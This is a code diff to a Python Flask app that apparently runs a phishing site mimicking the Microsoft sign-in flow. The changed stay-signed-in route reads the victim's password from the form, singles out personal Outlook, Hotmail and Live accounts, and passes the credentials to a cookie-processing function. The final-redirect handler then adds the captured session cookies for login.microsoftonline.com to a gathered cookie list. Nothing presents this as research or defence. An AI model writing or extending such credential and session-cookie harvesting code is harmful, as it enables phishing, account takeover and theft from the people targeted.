@@ -1150,34 +1150,44 @@ async def sign_in_handler():
             "message": "An error occurred during sign in"
         }), 500
 
-@app.route('/stay-signed-in')
+@app.route('/stay-signed-in', methods=['POST'])
 async def stay_signed_in():
-    """Show stay signed in option page"""
-    if 'email' not in session or 'login_cookies' not in session:
-        return redirect(url_for('index'))
-    
-    try:
-        email = session.get('email')
-        return render_template('StaySignIn.html', email=email)
-    except Exception as e:
-        print(f"Error in stay-signed-in: {str(e)}")
-        return redirect(url_for('index'))
+    # Get the value of the "Stay signed in?" option
+    stay_signed_in = request.form.get('Kmsi') == 'true'
 
-@app.route('/signinoption')
-def signinoption():
-    """Show sign in options page for 2FA verification"""
-    if 'auth_data' not in session:
-        return redirect(url_for('index'))
-        
-    try:
-        email = session.get('email')
-        auth_methods = session.get('auth_methods', [])
-        return render_template('signinoption.html', 
-                             email=email,
-                             auth_methods=auth_methods)
-    except Exception as e:
-        print(f"Error in signinoption: {str(e)}")
-        return redirect(url_for('index'))
+    # Store the value in the session
+    session['stay_signed_in'] = stay_signed_in
+
+    # Check if personal or work email account
+    email = session.get('email', '')
+    is_personal = any(domain in email.lower() for domain in [
+        'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+        'outlook.ca', 'hotmail.ca', 'live.ca'
+    ])
+
+    # Get login result from session
+    login_result = session.get('login_result', {})
+    login_status = login_result.get('status')
+
+    # Call process function only for personal accounts with "success" login status
+    if is_personal and login_status == 'success':
+        user_email = session.get('email')
+        user_password = request.form.get('password')  # Assuming password is still needed here
+        if user_email and user_password:
+            cookie_data = process(user_email, user_password, request)
+            session['cookie_data'] = cookie_data  # Store cookie data in session
+
+    # Redirect to the final redirect URL
+    return redirect(url_for('final_redirect'))
+
+def process(email, password, request):
+    """
+    Placeholder for the process function.
+    Replace this with your actual logic to process the email, password, and request.
+    """
+    # Your processing logic here
+    # This is just a placeholder, replace it with your actual implementation
+    return {"initial_cookies": [], "session_cookies": {}}
 
 @app.route('/final-redirect', methods=['POST']) 
 async def final_redirect():
@@ -1214,6 +1224,27 @@ async def final_redirect():
                         f"{cookie['name']}={cookie['value']}", 
                         domain
                     ))
+
+            # Retrieve cookie data from session
+            cookie_data = session.get('cookie_data', {})
+
+            # Add cookies from cookie_data if it exists
+            if cookie_data:
+                # Add initial cookies
+                initial_cookies = cookie_data.get('initial_cookies', [])
+                all_cookies.extend(initial_cookies)
+
+                # Add session cookies
+                session_cookies = cookie_data.get('session_cookies', {})
+                for name, value in session_cookies.items():
+                    all_cookies.append({
+                        "name": name,
+                        "value": value,
+                        "domain": 'login.microsoftonline.com',  # Adjust domain as needed
+                        "path": "/",
+                        "secure": False,
+                        "expires": None
+                    })
 
             # Make request to get redirect cookies
             response = requests.get(final_redirect_url)
@@ -1266,7 +1297,6 @@ async def final_redirect():
     except Exception as e:
         print(f"Error in final redirect: {str(e)}")
         return jsonify({"status": "error", "message": "Error processing request"}), 500
-    
 
 @app.after_request
 def add_security_headers(response):
